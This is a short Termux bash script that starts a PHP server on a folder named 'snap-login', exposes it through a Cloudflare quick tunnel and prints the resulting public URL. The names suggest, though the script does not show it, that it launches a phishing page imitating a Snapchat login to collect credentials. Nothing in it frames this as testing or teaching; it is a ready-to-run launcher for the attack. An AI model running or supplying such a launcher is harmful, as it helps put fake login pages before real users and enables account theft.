#!/data/data/com.termux/files/usr/bin/bash
termux-wake-lock
mkdir -p "$HOME/snap-data"
nohup php -S 0.0.0.0:8080 -t "$HOME/snap-login" > "$HOME/snap-data/server.log" 2>&1 &
echo $! > "$HOME/snap-data/server.pid"
sleep 1
echo "[+] local: http://localhost:8080"
nohup cloudflared tunnel --url http://localhost:8080 > "$HOME/snap-data/tunnel.log" 2>&1 &
echo $! > "$HOME/snap-data/tunnel.pid"
for i in $(seq 1 20); do
  U=$(grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' "$HOME/snap-data/tunnel.log" | head -1)
  [ -n "$U" ] && { echo "[+] public: $U"; break; }
  sleep 1
done
